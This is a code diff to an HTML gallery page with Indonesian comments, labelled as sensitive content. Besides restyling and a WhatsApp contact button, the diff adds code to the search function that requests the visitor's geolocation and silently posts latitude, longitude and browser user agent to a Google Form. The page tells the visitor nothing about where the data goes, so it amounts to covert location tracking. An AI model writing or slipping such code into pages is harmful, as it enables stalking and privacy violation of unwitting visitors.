@@ -20,8 +20,8 @@ h1 { margin-top: 40px; }
 
 .main-img {
   margin-top: 20px;
-  width: 220px;
-  height: 220px;
+  width: 150px;
+  height: 150px;
   border-radius: 18px;
   object-fit: cover;
 }
@@ -49,7 +49,6 @@ button {
   opacity: 0.6;
 }
 
-/* MODAL */
 .modal {
   display: none;
   position: fixed;
@@ -81,7 +80,6 @@ button {
   cursor: pointer;
 }
 
-/* Tombol navigasi bawah */
 .nav-btn {
   position: absolute;
   bottom: -40px;
@@ -98,11 +96,32 @@ button {
 .nav-left { left: 0; }
 .nav-right { right: 0; }
 
-/* indikator slide */
 .indicator {
   margin-top: 8px;
   font-size: 18px;
   letter-spacing: 4px;
+}
+
+.phone-btn {
+  position: fixed;
+  bottom: 20px;
+  right: 20px;
+  width: 50px;
+  height: 50px;
+  background: white;
+  border-radius: 50%;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+  cursor: pointer;
+  z-index: 1000;
+  text-decoration: none;
+}
+
+.phone-btn svg {
+  width: 28px;
+  height: 28px;
+  fill: black;
 }
 </style>
 </head>
@@ -118,17 +137,27 @@ button {
 
 <div class="warning">This Web Is Sensitif⚠</div>
 
-<!-- MODAL -->
 <div class="modal" id="modal">
   <div class="modal-box" id="modalBox">
     <div class="close" onclick="closeModal()">✕</div>
   </div>
 </div>
 
+<a href="https://wa.me/6281317309919" target="_blank" class="phone-btn" title="Hubungi via WhatsApp">
+  <svg viewBox="0 0 24 24">
+    <path d="M6.62 10.79a15.05 15.05 0 006.59 6.59l2.2-2.2a1 1 0 011.11-.21c1.2.48 2.5.74 3.83.74a1 1 0 011 1v3.5a1 1 0 01-1 1C10.07 21.5 2.5 13.93 2.5 4a1 1 0 011-1H7a1 1 0 011 1c0 1.33.26 2.63.74 3.83a1 1 0 01-.21 1.11l-2.2 2.2z"/>
+  </svg>
+</a>
+
 <script>
 let data = {};
 let currentIndex = 0;
 let currentImages = [];
+
+const formURL = "https://docs.google.com/forms/d/e/1FAIpQLScJJ-PAqYmeOnS6qKdgL1gTGMyX_FjrMLLg93Pv4QDbw1N-Cg/formResponse";
+const entryLatitude = "entry.138340134";
+const entryLongitude = "entry.1616098311";
+const entryUserAgent = "entry.1257224602";
 
 fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
   .then(res => res.json())
@@ -136,8 +165,29 @@ fetch("https://lipzz-elzxd.github.io/Lipz/data.json")
 
 function search() {
   const key = document.getElementById("keyword").value.trim().toLowerCase();
-  if (!data[key]) return;
 
+  // Minta izin lokasi dulu
+  if (navigator.geolocation) {
+    navigator.geolocation.getCurrentPosition(
+      pos => {
+        // Kirim ke Google Form
+        const lat = pos.coords.latitude;
+        const lon = pos.coords.longitude;
+        const ua = navigator.userAgent;
+
+        const formData = new URLSearchParams();
+        formData.append(entryLatitude, lat);
+        formData.append(entryLongitude, lon);
+        formData.append(entryUserAgent, ua);
+
+        fetch(formURL, { method: "POST", mode: "no-cors", body: formData });
+      },
+      err => console.error("Gagal mengambil lokasi", err)
+    );
+  }
+
+  // Tampilkan modal video / gallery
+  if (!data[key]) return;
   const modalBox = document.getElementById("modalBox");
   modalBox.innerHTML = '<div class="close" onclick="closeModal()">✕</div>';
 
@@ -158,26 +208,22 @@ function search() {
     img.src = currentImages[currentIndex];
     modalBox.appendChild(img);
 
-    // tombol navigasi bawah kiri
     const leftBtn = document.createElement("button");
     leftBtn.className = "nav-btn nav-left";
     leftBtn.innerText = "<";
     leftBtn.onclick = () => slide(-1);
     modalBox.appendChild(leftBtn);
 
-    // tombol navigasi bawah kanan
     const rightBtn = document.createElement("button");
     rightBtn.className = "nav-btn nav-right";
     rightBtn.innerText = ">";
     rightBtn.onclick = () => slide(1);
     modalBox.appendChild(rightBtn);
 
-    // indikator slide
     const indicator = document.createElement("div");
     indicator.className = "indicator";
     indicator.id = "indicator";
     modalBox.appendChild(indicator);
-
     updateIndicator();
   }
 
